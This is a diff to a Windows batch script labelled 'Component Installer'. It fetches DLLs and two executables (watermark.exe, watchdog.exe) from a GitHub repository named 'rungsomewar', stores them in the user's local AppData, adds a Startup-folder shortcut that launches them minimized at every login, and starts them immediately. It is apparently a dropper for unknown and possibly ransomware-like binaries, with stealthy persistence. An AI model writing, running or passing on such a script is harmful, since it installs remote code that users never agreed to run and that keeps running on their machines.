@@ -2,38 +2,34 @@
 setlocal
 title Component Installer
 
-:: 1. Setup the permanent home for these files
+:: Define Paths
 set "TARGET_DIR=%LOCALAPPDATA%\rungsomewar"
 set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
+:: Create folder if it doesn't exist
 if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"
 
-echo Downloading files from raw GitHub links...
+echo Downloading components using curl...
 
-:: 2. Download each file using your specific links
-powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; ^
-Invoke-WebRequest -Uri 'https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/SDL2.dll' -OutFile '%TARGET_DIR%\SDL2.dll' -UseBasicParsing; ^
-Invoke-WebRequest -Uri 'https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/SDL2_ttf.dll' -OutFile '%TARGET_DIR%\SDL2_ttf.dll' -UseBasicParsing; ^
-Invoke-WebRequest -Uri 'https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/libfreetype-6.dll' -OutFile '%TARGET_DIR%\libfreetype-6.dll' -UseBasicParsing; ^
-Invoke-WebRequest -Uri 'https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/zlib1.dll' -OutFile '%TARGET_DIR%\zlib1.dll' -UseBasicParsing; ^
-Invoke-WebRequest -Uri 'https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/watermark.exe' -OutFile '%TARGET_DIR%\watermark.exe' -UseBasicParsing; ^
-Invoke-WebRequest -Uri 'https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/watchdog.exe' -OutFile '%TARGET_DIR%\watchdog.exe' -UseBasicParsing"
+:: Download each file using your raw GitHub links
+curl -L -o "%TARGET_DIR%\SDL2.dll" "https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/SDL2.dll"
+curl -L -o "%TARGET_DIR%\SDL2_ttf.dll" "https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/SDL2_ttf.dll"
+curl -L -o "%TARGET_DIR%\libfreetype-6.dll" "https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/libfreetype-6.dll"
+curl -L -o "%TARGET_DIR%\zlib1.dll" "https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/zlib1.dll"
+curl -L -o "%TARGET_DIR%\watermark.exe" "https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/watermark.exe"
+curl -L -o "%TARGET_DIR%\watchdog.exe" "https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/watchdog.exe"
 
-:: 3. Create the startup shortcut
-set "VBS=%TEMP%\launcher.vbs"
-echo Set oWS = WScript.CreateObject("WScript.Shell") > "%VBS%"
-echo sLinkFile = "%STARTUP_DIR%\rungsomewar.lnk" >> "%VBS%"
-echo Set oLink = oWS.CreateShortcut(sLinkFile) >> "%VBS%"
-echo oLink.TargetPath = "%TARGET_DIR%\watchdog.exe" >> "%VBS%"
-echo oLink.WorkingDirectory = "%TARGET_DIR%" >> "%VBS%"
-echo oLink.Save >> "%VBS%"
+echo Setting up startup entry...
 
-cscript /nologo "%VBS%"
-del "%VBS%"
+:: Create a launcher batch in the target folder
+echo @echo off > "%TARGET_DIR%\run.bat"
+echo cd /d "%%~dp0" >> "%TARGET_DIR%\run.bat"
+echo start "" "watermark.exe" >> "%TARGET_DIR%\run.bat"
+echo start "" "watchdog.exe" >> "%TARGET_DIR%\run.bat"
 
-:: 4. Run immediately
-start "" "%TARGET_DIR%\watermark.exe"
-start "" "%TARGET_DIR%\watchdog.exe"
+:: Create the Startup Link via PowerShell (one-liner to avoid syntax errors)
+powershell -Command "$w=New-Object -ComObject WScript.Shell; $s=$w.CreateShortcut('%STARTUP_DIR%\rungsomewar.lnk'); $s.TargetPath='%TARGET_DIR%\run.bat'; $s.WindowStyle=7; $s.Save()"
 
-echo Installation Complete.
+echo Installation Complete. Starting applications...
+start "" "%TARGET_DIR%\run.bat"
 exit
